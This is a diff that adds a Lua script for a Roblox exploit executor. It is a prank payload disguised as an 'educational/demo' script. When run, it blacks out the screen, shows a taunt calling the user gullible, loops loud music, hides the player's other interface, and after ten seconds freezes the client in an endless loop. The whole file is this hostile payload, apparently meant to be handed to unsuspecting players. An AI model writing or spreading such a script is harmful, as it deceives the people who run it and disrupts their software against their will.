@@ -1,0 +1,56 @@
+-- Roblox Krnl Script: Epileptic Rickroll Blackout Crash
+-- This script is for educational/demo purposes only.
+
+-- Configuration
+local DISPLAY_TEXT = "YOU GULLIBLE BOZO"
+local TEXT_COLOR = Color3.fromRGB(255, 0, 0)
+local MUSIC_ID = "183763515" -- Never Gonna Give You Up (Roblox Audio AssetID)
+local CRASH_DELAY = 10 -- seconds
+
+-- Create fullscreen black GUI
+local screenGui = Instance.new("ScreenGui")
+screenGui.IgnoreGuiInset = true
+screenGui.ResetOnSpawn = false
+screenGui.DisplayOrder = 1000
+screenGui.Name = "__GullibleBozoBlackout"
+
+local frame = Instance.new("Frame")
+frame.BackgroundColor3 = Color3.new(0,0,0)
+frame.Size = UDim2.new(1,0,1,0)
+frame.Position = UDim2.new(0,0,0,0)
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
+
+local textLabel = Instance.new("TextLabel")
+textLabel.Text = DISPLAY_TEXT
+textLabel.TextColor3 = TEXT_COLOR
+textLabel.Font = Enum.Font.ArialBold
+textLabel.TextScaled = true
+textLabel.Size = UDim2.new(1, 0, 1, 0)
+textLabel.BackgroundTransparency = 1
+textLabel.Parent = frame
+
+local sound = Instance.new("Sound")
+sound.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+sound.SoundId = "rbxassetid://"..MUSIC_ID
+sound.Volume = 2
+sound.Looped = true
+
+-- Apply to PlayerGui
+screenGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+sound:Play()
+
+-- Crash function
+task.delay(CRASH_DELAY, function()
+    -- Attempt to crash with various methods
+    while true do
+        print(math.huge^math.huge)
+    end
+end)
+
+-- OPTIONAL: Remove other UI elements (client-side only)
+for _, v in ipairs(game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"):GetChildren()) do
+    if v ~= screenGui and v:IsA("ScreenGui") then
+        v.Enabled = false
+    end
+end
